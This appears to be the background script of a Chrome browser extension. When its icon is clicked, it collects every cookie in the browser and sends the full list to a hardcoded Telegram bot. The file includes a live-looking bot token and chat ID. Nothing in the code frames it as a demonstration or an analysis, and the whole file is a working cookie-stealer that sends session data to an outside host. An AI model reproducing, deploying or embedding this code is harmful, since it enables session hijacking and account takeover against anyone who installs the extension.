chrome.runtime.onInstalled.addListener(() => {
    console.log("Extension installed.");
});

// Function to extract all cookies
function getAllCookies() {
    chrome.cookies.getAll({}, function(cookies) {
        let cookieList = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join("; ");
        sendCookiesToTelegram(cookieList);
    });
}

// Function to send cookies to Telegram
function sendCookiesToTelegram(cookieValue) {
    const botToken = '7694280275:AAGH4Vj9dh9gCMoAwmPeikpWbtyStdNwXc8';  // Your bot token
    const chatId = '693873866';  // Your chat ID
    const message = encodeURIComponent(`Extracted Cookies: ${cookieValue}`);

    // Fetch API to send the message to Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
        .then(response => {
            if (response.ok) {
                console.log("Cookies sent to Telegram successfully.");
            } else {
                console.log("Failed to send cookies to Telegram.");
            }
        })
        .catch(error => {
            console.error("Error sending message to Telegram:", error);
        });
}

// Listen for a browser action (click on the extension icon)
chrome.action.onClicked.addListener((tab) => {
    getAllCookies();  // Extract and send all cookies when the user clicks the extension icon
});
